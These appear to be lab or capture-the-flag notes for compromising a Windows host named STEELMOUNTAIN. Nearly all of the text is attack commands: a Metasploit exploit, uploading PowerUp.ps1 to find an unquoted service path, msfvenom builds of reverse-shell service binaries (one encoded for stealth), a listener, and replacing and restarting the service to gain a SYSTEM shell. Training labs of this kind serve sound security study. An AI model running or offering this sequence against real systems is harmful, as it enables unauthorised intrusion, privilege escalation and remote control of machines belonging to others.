Use exploit, upload PowerUp.ps1, stop service, generate/upload reverse shell, setup listener, restart service, get reverse shell

# msfconsole -> meterpreter

$ msfconsole

search xxxx
use 0
options
set RHOSTS xxx
set RPORT xxx
exploit

meterpreter > getuid 
meterpreter > cd c:\user\xxx\Desktop 
meterpreter > Crt Z


## Execute Powershell script 
$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1

meterpreter > upload PowerUp.ps1
meterpreter > load powershell
meterpreter > powershell_shell
PS > . .\Powerup.ps1
PS > Invoke-Allchecks  


## PowerUp.ps1 output
ServiceName    : AdvancedSystemCareService9
Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
__ModifiablePath__ : @{ModifiablePath=C:\Program Files (x86)\IObit; IdentityReference=STEELMOUNTAIN\bill;
                 Permissions=System.Object[]}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
__CanRestart__     : True
Name           : AdvancedSystemCareService9
Check          : Unquoted Service Paths


## Stop windows service

meterpreter > shell
C:\Users\xxx> ssc stop ASCService
Ctr-Z

## Generate reverse shell

__Basic bin__
$ msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -f exe  -o ASCService.exe

__Meterpreter + stealth + service__
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe

## Setup listener 
  

meterpreter > background
msf5 exploit(windows/http/rejetto_hfs_exec) > use multi/handler
msf5 exploit(multi/handler) > set payload windows/shell_reverse_tcp
msf5 exploit(multi/handler) > set LHOST 10.10.121.196
msf5 exploit(multi/handler) > set LPORT 4443
msf5 exploit(multi/handler) > run -j
msf5 exploit(multi/handler) > sessions 2
[*] Starting interaction with 2...

    
## Upload new service
  
meterpreter >upload Advanced.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"

## Start windows service

meterpreter > shell
C:\Users\xxx> sc start ASCService
Ctr-Z




